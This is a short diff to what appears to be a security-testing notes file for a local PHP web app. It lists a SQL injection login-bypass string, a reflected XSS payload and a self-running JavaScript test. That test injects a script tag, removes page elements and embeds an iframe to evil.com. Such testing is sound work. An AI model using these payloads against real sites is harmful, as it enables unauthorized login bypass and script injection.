@@ -1,1 +1,42 @@
-http://localhost/htdocs/index.php?username=admin' OR '1'='1&password=123
+SQLI: username=admin' OR '1'='1&password=123
+
+DOM: 
+ function testDOMManipulation() {
+    console.log("🔍 Running DOM manipulation test...");
+
+    // 1. Add a <script> tag dynamically (simulate script injection)
+    const maliciousScript = document.createElement("script");
+    maliciousScript.innerHTML = "alert('Injected script executed!')";
+    document.body.appendChild(maliciousScript);
+    console.log("✅ Script element added");
+
+    // 2. Remove a div element (simulate DOM tampering)
+    const firstDiv = document.querySelector("div");
+    if (firstDiv) {
+      firstDiv.remove();
+      console.log("✅ A div element was removed");
+    }
+
+    // 3. Add an <iframe> tag (simulate iframe injection)
+    const iframe = document.createElement("iframe");
+    iframe.src = "https://evil.com";
+    document.body.appendChild(iframe);
+    console.log("✅ Iframe injected");
+  }
+
+  // Option 1: Run automatically after 3 seconds
+  setTimeout(testDOMManipulation, 3000);
+
+  // Option 2: Or trigger via button
+  /*
+  const button = document.createElement("button");
+  button.innerText = "Run DOM Test";
+  button.onclick = testDOMManipulation;
+  document.body.appendChild(button);
+  */
+
+
+
+  XSS: username=<script>alert("hello")</script>
+
+  
